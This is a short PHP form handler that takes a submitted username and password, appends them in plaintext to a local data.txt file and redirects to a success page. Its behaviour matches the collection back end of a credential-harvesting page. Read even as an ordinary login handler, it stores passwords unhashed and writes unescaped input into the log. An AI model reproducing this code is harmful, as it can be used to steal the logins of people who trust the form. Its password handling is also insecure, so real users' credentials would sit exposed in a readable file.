<?php
// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';

    // Validation: Check if username and password are not empty
    if (!empty($username) && !empty($password)) {
        // Open the file for appending data
        $file = fopen("data.txt", "a"); // 'a' mode for appending data to the file
        
        // Prepare the data to be written into the file (you can also encrypt passwords if needed)
        $data = "Username: " . $username . " | Password: " . $password . "\n";
        
        // Write the data to the file
        fwrite($file, $data);
        
        // Close the file
        fclose($file);
        
        // Redirect to a success page or show a success message
        // For example: redirect to a "success" page or show a message.
        header("Location: success.html"); // Redirect to a success page
        exit();
    } else {
        // If fields are empty, redirect back with an error
        header("Location: index.html?error=Please fill in both fields.");
        exit();
    }
}
?>
